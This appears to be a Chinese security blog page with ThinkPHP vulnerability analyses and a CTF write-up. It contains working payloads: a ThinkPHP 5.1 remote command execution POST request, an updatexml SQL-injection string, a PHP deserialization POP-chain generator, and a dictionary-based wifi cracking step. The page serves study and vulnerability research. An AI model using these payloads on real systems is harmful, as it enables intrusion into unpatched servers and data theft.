<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>oxcccccc</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="oxcccccc">
<meta property="og:url" content="https://www.ccreater.top/page/4/index.html">
<meta property="og:site_name" content="oxcccccc">
<meta property="og:locale" content="zh">
<meta property="article:author" content="ccreater">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="oxcccccc" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 4.2.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">oxcccccc</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://www.ccreater.top"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/ThinkPHP%205.1.x-5.2.x%E5%85%A8%E7%89%88%E6%9C%ACRCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/ThinkPHP%205.1.x-5.2.x%E5%85%A8%E7%89%88%E6%9C%ACRCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ThinkPHP-5-1-x-5-2-x全版本RCE-漏洞分析"><a href="#ThinkPHP-5-1-x-5-2-x全版本RCE-漏洞分析" class="headerlink" title="ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析"></a>ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析</h1><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>5.1.x-5.1.32  5.2.x(这个还没去看)</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>补丁: <a href="https://github.com/top-think/framework/commit/2454cebcdb6c12b352ac0acd4a4e6b25b31982e6" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/2454cebcdb6c12b352ac0acd4a4e6b25b31982e6</a> </p>
<p>测试环境 5.1.29</p>
<p><strong>入口处关闭报错</strong> </p>
<p><img src="https://i.loli.net/2020/01/30/2x4QWZYgmXjqo8r.png" alt="image283"></p>
<p>和5.0.x版本的漏洞有着相似之处,都是<code>$this-&gt;method</code>方法未过滤导致的任意变量覆盖,从而导致命令执行</p>
<p>通过<code>$_POST[&#39;_method&#39;]=xxxxx</code>来进行任意变量覆盖</p>
<p>我们选择覆盖<code>$this-&gt;filter</code>,翻找Request类中的函数发现还是<code>Request::input</code>处可以命令执行,下断点可以看到调用堆栈</p>
<p><img src="https://i.loli.net/2020/01/30/dVyPeZHbYM3TFq7.png" alt="image527"></p>
<p>我们从<code>Request::param</code>处开始分析</p>
<pre><code class="php">public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
    {
        if (!$this-&gt;mergeParam) {
            $method = $this-&gt;method(true);

            // 自动获取请求变量
            switch ($method) {
                case &#39;POST&#39;:
                    $vars = $this-&gt;post(false);
                    break;
                case &#39;PUT&#39;:
                case &#39;DELETE&#39;:
                case &#39;PATCH&#39;:
                    $vars = $this-&gt;put(false);
                    break;
                default:
                    $vars = [];
            }

            // 当前请求参数和URL地址中的参数合并
            $this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));

            $this-&gt;mergeParam = true;
        }

        ...
    }</code></pre>
<p>因为是POST请求所以会进入POST分支,跟进<code>Request::post</code></p>
<pre><code class="php">    public function post($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
    {
        if (empty($this-&gt;post)) {
            $this-&gt;post = !empty($_POST) ? $_POST : $this-&gt;getInputData($this-&gt;input);
        }

        return $this-&gt;input($this-&gt;post, $name, $default, $filter);
    }</code></pre>
<p>接着便会调用<code>Request::input</code>,其中<code>$this-&gt;post</code>和<code>$filter</code>可控</p>
<p>跟进<code>Request::input</code></p>
<pre><code class="php">public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
    {
        ...

        // 解析过滤器
        $filter = $this-&gt;getFilter($filter, $default);

        if (is_array($data)) {
            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);
            reset($data);
        } else {
            $this-&gt;filterValue($data, $name, $filter);
        }

       ...
    }</code></pre>
<p>因为<code>$data</code>是数组(<code>$_POST</code>),调用<code>array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);</code></p>
<p>对<code>$data</code>中所有值调用<code>Request::filterValue</code></p>
<p>跟进去</p>
<pre><code class="php">private function filterValue(&amp;$value, $key, $filters)
    {
        $default = array_pop($filters);

        foreach ($filters as $filter) {
            if (is_callable($filter)) {
                // 调用函数或者方法过滤
                $value = call_user_func($filter, $value);
            } elseif (is_scalar($value)) {
                if (false !== strpos($filter, &#39;/&#39;)) {
                    // 正则过滤
                    if (!preg_match($filter, $value)) {
                        // 匹配不成功返回默认值
                        $value = $default;
                        break;
                    }
                } elseif (!empty($filter)) {
                    // filter函数不存在时, 则使用filter_var进行过滤
                    // filter为非整形值时, 调用filter_id取得过滤id
                    $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));
                    if (false === $value) {
                        $value = $default;
                        break;
                    }
                }
            }
        }

        return $value;
    }</code></pre>
<p>阅读代码可知,filterValue会对<code>$_POST</code>中所有值调用<code>$filter</code>中每一个可以调用的函数或方法</p>
<p>且<code>$filter</code>=<code>$_POST</code></p>
<p>因此有</p>
<pre><code>http://127.0.0.1/public/
POST:  var1=exec&amp;var2=calc.exe&amp;_method=filter</code></pre><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>对method进行了白名单限制</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://www.smi1e.top/thinkphp-5-1-x5-2-x全版本-rce-漏洞分析/" target="_blank" rel="noopener">https://www.smi1e.top/thinkphp-5-1-x5-2-x全版本-rce-漏洞分析/</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://www.ccreater.top/1970/01/01/ThinkPHP">https://www.ccreater.top/1970/01/01/ThinkPHP</a> 5.1.x-5.2.x全版本RCE 漏洞分析/](<a href="https://www.ccreater.top/1970/01/01/ThinkPHP">https://www.ccreater.top/1970/01/01/ThinkPHP</a> 5.1.x-5.2.x全版本RCE 漏洞分析/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/ThinkPHP%205.1.x-5.2.x%E5%85%A8%E7%89%88%E6%9C%ACRCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-id="ckmn5756k0045s1ni1074ar45" data-title="ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-ThinkPHP框架5.0.x_SQL注入分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/ThinkPHP%E6%A1%86%E6%9E%B65.0.x_SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/ThinkPHP%E6%A1%86%E6%9E%B65.0.x_SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/">ThinkPHP框架5.0.x_SQL注入分析</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ThinkPHP框架5-0-x-SQL注入分析-amp-数据库配置泄露"><a href="#ThinkPHP框架5-0-x-SQL注入分析-amp-数据库配置泄露" class="headerlink" title="ThinkPHP框架5.0.x SQL注入分析 &amp; 数据库配置泄露"></a>ThinkPHP框架5.0.x SQL注入分析 &amp; 数据库配置泄露</h1><h2 id="应用范围"><a href="#应用范围" class="headerlink" title="应用范围"></a>应用范围</h2><p>开启debug模式的thinkphp5.0.x</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>从官网上下载5.0.9完整版</p>
<p><code>application/index/controller/index.php</code>内容如下</p>
<pre><code class="php">&lt;?php
namespace app\index\controller;

use app\model\Gather;

class Index
{
    public function index()
    {
        $ids = input(&#39;ids/a&#39;);
        $t = db(&quot;user&quot;);
        $result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();

    }
}
</code></pre>
<p><img src="https://i.loli.net/2020/02/01/8hmETeuW31p5Zb6.png" alt="image460"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们在漏洞的关键位置下个断点进行分析,<code>thinkphp\library\think\db\Builder.php</code>:383行</p>
<p>调用堆栈为:</p>
<p><img src="https://i.loli.net/2020/02/01/YFfV74U8cxTLS2H.png" alt="image609"></p>
<p>从index()方法开始</p>
<pre><code class="php">public function index()
    {
        $ids = input(&#39;ids/a&#39;);
        $t = db(&quot;user&quot;);
        $result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();

    }</code></pre>
<p>调用<code>$t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)</code>返回值的select()方法</p>
<p>我们先看下select()方法,它会将<code>$option</code>作为参数调用<code>Builder::select</code>方法</p>
<pre><code class="php">public function select($data = null)
    {
        ...

        // 分析查询表达式
        $options = $this-&gt;parseExpress();

        ...
        if (!$resultSet) {
            // 生成查询SQL
            $sql = $this-&gt;builder-&gt;select($options);
            // 获取参数绑定
            ...
            }

            ...

    }</code></pre>
<p>我们跟进<code>$this-&gt;parseExpress();</code>看<code>$option</code>是如何生成的</p>
<pre><code class="php">protected function parseExpress()
    {
        $options = $this-&gt;options;
        ...
    }</code></pre>
<p>这里是直接令<code>$options = $this-&gt;options;</code>,而<code>$this-&gt;options</code>是<code>$t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)</code>过程生成的</p>
<p>跟进去发现有这一条语句 <code>$this-&gt;options[&#39;where&#39;][$logic] = array_merge($this-&gt;options[&#39;where&#39;][$logic], $where);</code>,其中<code>$where</code>由<code>$where[$field] = [$op, $condition, isset($param[2]) ? $param[2] : null];</code>得到</p>
<p>获得<code>$option</code>的调用链为:</p>
<p><code>$result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();</code> ( <code>public function where($field, $op = null, $condition = null)</code> ) =&gt; <code>$this-&gt;parseWhereExp(&#39;AND&#39;, $field, $op, $condition, $param);</code>  =&gt; <code>$where[$field] = [$op, $condition, isset($param[2]) ? $param[2] : null];</code> </p>
<p>我们回到<code>$this-&gt;builder-&gt;select($options);</code>,现在我们知道<code>$this-&gt;options[&#39;where&#39;][$logic]</code>是我们的可控位置</p>
<p>跟进去</p>
<pre><code class="php">public function select($options = [])
    {
        $sql = str_replace(
            [&#39;%TABLE%&#39;, &#39;%DISTINCT%&#39;, &#39;%FIELD%&#39;, &#39;%JOIN%&#39;, &#39;%WHERE%&#39;, &#39;%GROUP%&#39;, &#39;%HAVING%&#39;, &#39;%ORDER%&#39;, &#39;%LIMIT%&#39;, &#39;%UNION%&#39;, &#39;%LOCK%&#39;, &#39;%COMMENT%&#39;, &#39;%FORCE%&#39;],
            [
                $this-&gt;parseTable($options[&#39;table&#39;], $options),
                $this-&gt;parseDistinct($options[&#39;distinct&#39;]),
                $this-&gt;parseField($options[&#39;field&#39;], $options),
                $this-&gt;parseJoin($options[&#39;join&#39;], $options),
                $this-&gt;parseWhere($options[&#39;where&#39;], $options),
                $this-&gt;parseGroup($options[&#39;group&#39;]),
                $this-&gt;parseHaving($options[&#39;having&#39;]),
                $this-&gt;parseOrder($options[&#39;order&#39;], $options),
                $this-&gt;parseLimit($options[&#39;limit&#39;]),
                $this-&gt;parseUnion($options[&#39;union&#39;]),
                $this-&gt;parseLock($options[&#39;lock&#39;]),
                $this-&gt;parseComment($options[&#39;comment&#39;]),
                $this-&gt;parseForce($options[&#39;force&#39;]),
            ], $this-&gt;selectSql);
        return $sql;
    }</code></pre>
<p>这个<code>$this-&gt;parseWhere($options[&#39;where&#39;], $options)</code>分支进入了关键的漏洞位置,此时<code>$where</code>可控</p>
<pre><code class="php">protected function parseWhere($where, $options)
    {
        $whereStr = $this-&gt;buildWhere($where, $options);
        ...
        return empty($whereStr) ? &#39;&#39; : &#39; WHERE &#39; . $whereStr;
    }</code></pre>
<p>再跟进<code>$this-&gt;buildWhere($where, $options)</code>,此时<code>$where</code>可控</p>
<pre><code class="php">public function buildWhere($where, $options)
    {
        if (empty($where)) {
            $where = [];
        }

        if ($where instanceof Query) {
            return $this-&gt;buildWhere($where-&gt;getOptions(&#39;where&#39;), $options);
        }

        $whereStr = &#39;&#39;;
        $binds    = $this-&gt;query-&gt;getFieldsBind($options[&#39;table&#39;]);
        foreach ($where as $key =&gt; $val) {
            $str = [];
            foreach ($val as $field =&gt; $value) {
                ...
                    // 对字段使用表达式查询
                    $field = is_string($field) ? $field : &#39;&#39;;
                    $str[] = &#39; &#39; . $key . &#39; &#39; . $this-&gt;parseWhereItem($field, $value, $key, $options, $binds);

            }

            $whereStr .= empty($whereStr) ? substr(implode(&#39; &#39;, $str), strlen($key) + 1) : implode(&#39; &#39;, $str);
        }

        return $whereStr;
    }</code></pre>
<p><code>$whereStr .= empty($whereStr) ? substr(implode(&#39; &#39;, $str), strlen($key) + 1) : implode(&#39; &#39;, $str);</code>这个生成了sql语句的where部分,其中<code>$str</code>是由<code>$str[] = &#39; &#39; . $key . &#39; &#39; . $this-&gt;parseWhereItem($field, $value, $key, $options, $binds);</code>生成的,而参数<code>$value[1]</code>就是我们<code>ids[1,updatexml(0,concat(0x7e,(database()),0x7e),1)]=123%23</code>payload中的键值</p>
<p>跟进<code>$this-&gt;parseWhereItem($field, $value, $key, $options, $binds);</code></p>
<pre><code class="php">protected function parseWhereItem($field, $val, $rule = &#39;&#39;, $options = [], $binds = [], $bindName = null)
    {
        $key = $field ? $this-&gt;parseKey($field, $options) : &#39;&#39;;

        // 查询规则和条件
        if (!is_array($val)) {
            $val = [&#39;=&#39;, $val];
        }
        list($exp, $value) = $val;
        // 字段分析
        if(....){
            ...
        } elseif (in_array($exp, [&#39;NOT IN&#39;, &#39;IN&#39;])) {
            // IN 查询
            if ($value instanceof \Closure) {
                $whereStr .= $key . &#39; &#39; . $exp . &#39; &#39; . $this-&gt;parseClosure($value);
            } else {
                $value = is_array($value) ? $value : explode(&#39;,&#39;, $value);
                if (array_key_exists($field, $binds)) {
                    $bind  = [];
                    $array = [];
                    foreach ($value as $k =&gt; $v) {
                        if ($this-&gt;query-&gt;isBind($bindName . &#39;_in_&#39; . $k)) {
                            $bindKey = $bindName . &#39;_in_&#39; . uniqid() . &#39;_&#39; . $k;
                        } else {
                            $bindKey = $bindName . &#39;_in_&#39; . $k;
                        }
                        $bind[$bindKey] = [$v, $bindType];
                        $array[]        = &#39;:&#39; . $bindKey;
                    }
                    $this-&gt;query-&gt;bind($bind);
                    $zone = implode(&#39;,&#39;, $array);
                } else {
                    $zone = implode(&#39;,&#39;, $this-&gt;parseValue($value, $field));
                }
                $whereStr .= $key . &#39; &#39; . $exp . &#39; (&#39; . (empty($zone) ? &quot;&#39;&#39;&quot; : $zone) . &#39;)&#39;;
            }
        } 
        return $whereStr;
    }</code></pre>
<p>然后我们可以看到当<code>in_array($exp, [&#39;NOT IN&#39;, &#39;IN&#39;])</code>条件满足时,将会直接将我们payload中的键值直接拼接到sql语句中</p>
<pre><code class="php">                foreach ($value as $k =&gt; $v) {
                        if ($this-&gt;query-&gt;isBind($bindName . &#39;_in_&#39; . $k)) {
                            $bindKey = $bindName . &#39;_in_&#39; . uniqid() . &#39;_&#39; . $k;
                        } else {
                            $bindKey = $bindName . &#39;_in_&#39; . $k;
                        }
                        $bind[$bindKey] = [$v, $bindType];
                        $array[]        = &#39;:&#39; . $bindKey;
                    }</code></pre>
<p>而<code>$exp</code>则由<code>$result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();</code>中的<code>&#39;in&#39;</code>经过一系列操作后得到</p>
<p>但是这里只能进行没有子查询语句的sql报错注入</p>
<p>如果有子查询语句的话就会报<code>SQLSTATE[HY000]: General error: 1105 Only constant XPATH queries are supported</code>的错误</p>
<p>所以这个sql注入有点不行,但时sql报错会暴露数据库配置却是非常有用的</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://zerokeeper.com/vul-analysis/thinkphp-framework-50x-sql-injection-analysis.html" target="_blank" rel="noopener">https://zerokeeper.com/vul-analysis/thinkphp-framework-50x-sql-injection-analysis.html</a> </p>
<p> <a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/ThinkPHP框架5.0.x_SQL注入分析/">https://www.ccreater.top/1970/01/01/ThinkPHP框架5.0.x_SQL注入分析/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/ThinkPHP%E6%A1%86%E6%9E%B65.0.x_SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/" data-id="ckmn5756l0047s1ni42fyft9k" data-title="ThinkPHP框架5.0.x_SQL注入分析" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-byb2019" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/byb2019/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/byb2019/">百越杯2019</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="byb"><a href="#byb" class="headerlink" title="byb"></a>byb</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>cGxlYXNlIHN1Ym1pdDogZmxhZ3toZWxsb19ieWJ9</p>
<p>base64decode </p>
<p><code>please submit: flag{hello_byb}</code></p>
<h3 id="key"><a href="#key" class="headerlink" title="key"></a>key</h3><p>下载附件,用photoshop放大查看,有一条奇奇怪怪的钥匙</p>
<p>用hxd打开图片在图片末尾找到KEY:ISEEU!</p>
<p>提取钥匙中特殊颜色的RGB值与key循环异或</p>
<pre><code>2f3f24
222e13
7f6624
713645
7b7e27
723310
646721
76670c
703723
727816
7a6020
213345
7b3277
74375c</code></pre><pre><code class="python">rgb=[&#39;2f&#39;,&#39;3f&#39;,&#39;24&#39;,&#39;22&#39;,&#39;2e&#39;,&#39;13&#39;,&#39;7f&#39;,&#39;66&#39;,&#39;24&#39;,&#39;71&#39;,&#39;36&#39;,&#39;45&#39;,&#39;7b&#39;,&#39;7e&#39;,&#39;27&#39;,&#39;72&#39;,&#39;33&#39;,&#39;10&#39;,&#39;64&#39;,&#39;67&#39;,&#39;21&#39;,&#39;76&#39;,&#39;67&#39;,&#39;0c&#39;,&#39;70&#39;,&#39;37&#39;,&#39;23&#39;,&#39;72&#39;,&#39;78&#39;,&#39;16&#39;,&#39;7a&#39;,&#39;60&#39;,&#39;20&#39;,&#39;21&#39;,&#39;33&#39; ,&#39;45&#39;,&#39;7b&#39;,&#39;32&#39;,&#39;77&#39;,&#39;74&#39;,&#39;37&#39;,&#39;5c&#39;]

key=&quot;ISEEU!&quot;
j=0
for i in rgb:
    print(chr(int(i,16)^ord(key[j])),end=&#39;&#39;)
    j+=1
    j%=6</code></pre>
<p>flag{265a4cd2-b7f1-4d32-9df7-733edfd2a21b}</p>
<h3 id="哈尔的移动城堡"><a href="#哈尔的移动城堡" class="headerlink" title="哈尔的移动城堡"></a>哈尔的移动城堡</h3><p>下载附件得到ori.jpg和102%</p>
<p>用hxd打开后发现</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t8ovhhnlj306f05nwf0.jpg" alt="image.png"></p>
<p>这是一张png图片但是文件头错了</p>
<p>划到最后面发现PK</p>
<p>图片里面又藏在压缩包,搜索IEND找到png的最后一个数据块(别问我为啥不用foremost,谁用谁知道)</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t8uu1b1yj30jy025jry.jpg" alt="image.png"></p>
<p>又是一个魔改的文件头(正常zip文件头 504B0304 ),手动分离得到zip</p>
<p>emmmm需要密码</p>
<p>用stegsolve发现分离出来的png里藏着二维码</p>
<p>猜测做了蒙版处理</p>
<p>打开ps一段猛如虎()(自闭)的操作后,手动拼接出了二维码</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t8zumovfj309o0aa0t2.jpg" alt="image.png"></p>
<p>得到压缩包密码1tsEz_b14ndVV4t3rM4k</p>
<p>解压得到两张图片</p>
<p>用beyondcompare得到flag</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t93pbylej30em0jjgqg.jpg" alt="image.png"></p>
<p>flag{3399dcb7-9e15-422f-9bf9-9db30dab70ae}</p>
<h3 id="wireless"><a href="#wireless" class="headerlink" title="wireless"></a>wireless</h3><p>下载得到readme和一个流量</p>
<p>readme</p>
<pre><code>已知密码格式是6666xxxx</code></pre><p>原本试着生成一个所有可打印字符的密码,但是这个也要500m+</p>
<p>所以先用纯数字密码试试</p>
<pre><code class="python">f=open(&quot;dict.txt&quot;,&quot;w&quot;)
for i in range(10**4):
    f.write(&quot;6666%04d\n&quot;%i)
f.close()</code></pre>
<p>用kali的<code>aircrack-ng</code> 来破解通信内容</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t9ym6aq4j30ka0djwoh.jpg" alt="image.png"></p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t9zwgppwj30kf0e3aj3.jpg" alt="image.png"></p>
<p>flag{0566668912-f059-448f}</p>
<p>幸亏没有直接爆所有可打印字符</p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><pre><code class="php">&lt;?php
error_reporting(1);
class Read {
    private $var;
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }

    public function __invoke(){
        $content = $this-&gt;file_get($this-&gt;var);
        echo $content;
    }
}

class Show
{
    public $source;
    public $str;
    public function __construct($file=&#39;index.php&#39;)
    {
        $this-&gt;source = $file;
        echo $this-&gt;source.&#39;瑙ｆ瀽寮€濮�&#39;.&quot;&lt;br&gt;&quot;;
    }

    public function __toString()
    {

        $this-&gt;str[&#39;str&#39;]-&gt;source;
    }

    public function _show()
    {

        if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|fllllllaaaaaag/i&#39;,$this-&gt;source)) {
            die(&#39;hacker!&#39;);
        } else {
            highlight_file($this-&gt;source);
        }

    }

    public function __wakeup()
    {
        print(&quot;step1&quot;);
        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) {
            echo &quot;hacker~&quot;;
            $this-&gt;source = &quot;index.php&quot;;
        }
    }
}

class Test
{
    public $params;
    public function __construct()
    {
        $this-&gt;params = array();
    }

    public function __get($key)
    {
        $func = $this-&gt;params;
        return $func();
    }  
}

if(isset($_GET[&#39;chal&#39;]))
{
    $chal = unserialize($_GET[&#39;chal&#39;]);
}
else
{
    $show = new Show(&#39;index.php&#39;);
    $show-&gt;_show();
}
?&gt;</code></pre>
<p>%100反序列化链构造</p>
<ol>
<li><p><code>Show::__wake</code>是唯一可以入手的地方</p>
</li>
<li><p>在这个方法中只有$this-&gt;source可以构造pop链的连接点</p>
</li>
</ol>
<p>阅读代码发现<code>Show::__toString</code>会被<code>if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source))</code>调用</p>
<ol start="3">
<li><code>Show::__toString</code>:  $this-&gt;str[‘str’]-&gt;source和<code>Test::__get</code>构成链接点</li>
<li><code>Test::__get</code>: <code>$func = $this-&gt;params;return $func();</code>和<code>Read::__invoke</code>构成链接点</li>
<li>而Read()可以任意读取文件</li>
</ol>
<p>payload生成:</p>
<pre><code class="php">&lt;?php
class Show
{
    public $source;
    public $str;
    public function __construct($file=&quot;&quot;)
    {

    }
    public function _show()
    {
        if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|fllllllaaaaaag/i&#39;,$this-&gt;source)) {
            die(&#39;hacker!&#39;);
        } else {
            highlight_file($this-&gt;source);
        }

    }

    public function __wakeup()
    {
    }
}
class Read {
    private $var=&quot;fllllllaaaaaag.php&quot;;

    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }

    public function __invoke(){
        $content = $this-&gt;file_get($this-&gt;var);
        echo $content;
    }
}
class Test
{
    public $params;
    private $source=&quot;666&quot;;
    public function __construct()
    {
    }
    public function __get($key)
    {
        $func = $this-&gt;params;
        return $func();
    }  
}

$a=new Show();
$b=new Show();
$c=new Test;
//$s-&gt;str[&quot;str&quot;] = $t;

//Read::__invoke
$c-&gt;params=new Read;

//Test::__get
$b-&gt;str[&#39;str&#39;]=$c;

//Show::__tostring
$a-&gt;source=$b;

print(urlencode(serialize($a)));
?&gt;</code></pre>
<p>最后一步就剩flag的文件名,从正则中抠出<code>fllllllaaaaaag</code>但是直接读取,网页500,是文件不存在的结果</p>
<p>一番尝试后flag的文件名<code>fllllllaaaaaag.php</code></p>
<pre><code>&lt;?php
$flag = &quot;flag{df210681-fb10-4c0f-ba25-1f678eb38f85}&quot;;
?&gt;</code></pre><h3 id="babygame"><a href="#babygame" class="headerlink" title="babygame"></a>babygame</h3><p>文件树</p>
<pre><code>index.html
tools.php?hash=
manage.php?showuer
            register
            login
            msgid=1
</code></pre><p>index.html</p>
<p><code>&lt;!-- if you need hash tools, location: tools.php --&gt;</code></p>
<p>flag生成方式</p>
<p><code>flag{md5(name . md5(pass))}</code></p>
<p>网站存在两个cookie: __jsluid_h , PHPSESSID </p>
<p>约束攻击生效,但是无法拿到flag</p>
<p>二次注入测试逃逸引号</p>
<p>宽字节x=&gt;正常回显</p>
<p>%00x=&gt;\0</p>
<p>出现需要转义的地方没有假flag</p>
<p><code>a&#39;#</code>没有flag</p>
<p><code>a\&#39;#</code>出现flag,md5为<code>flag{md5(&quot;a\\\&#39;&quot; . md5(pass))}</code></p>
<p>而直接<code>b\&#39;#</code>是没有flag的,而且与#无关</p>
<p>判断用户时候存在再给一个flag链接</p>
<pre><code>a\\\&#39;#=&gt;a\&#39;#=&gt;select * from xx where user=&#39;$user&#39;?

a\&#39;=&gt;a&#39;,用户不存在

猜测</code></pre><p><code>c\&#39;#</code>=&gt;no flag</p>
